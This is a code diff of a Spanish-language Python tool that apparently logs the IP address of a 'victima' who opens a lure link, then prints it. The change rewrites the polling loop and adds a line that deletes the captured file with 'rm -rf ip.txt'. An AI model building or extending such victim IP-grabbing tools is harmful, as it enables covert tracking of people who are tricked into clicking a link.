@@ -1,10 +1,6 @@
 import os
 import subprocess
 import time
-from os import path
-
-IP = "ip.txt"
-
 
 logo = """\033[33m
   _____ _____  _      ____   _____  _____ ______ _____  
@@ -21,17 +17,15 @@ def cat():
  # os.system("cat ip.txt")
   print('\n\033[94m[!] IP de la victima encontrado')
   print(f'\n[~] IP: ', os.system("cat ip.txt"))
+  os.system("rm -rf ip.txt")
 
 def check():
-    printed = False
     while True:
-        lol = path.getsize(IP)
-        if lol == 0 and printed is False:
-            print('\n[~] Esperando a que una persona entre al link presionta CTRL + C para salir')
-            printed = True
-        elif lol > 0:
-            cat()
-            printed = False
+        with open('ip.txt') as ip:
+            lines = ip.read().rstrip()
+            if len(lines) != 0:
+                cat()
+        ip.close()   
 
 def server():
     os.system("clear")
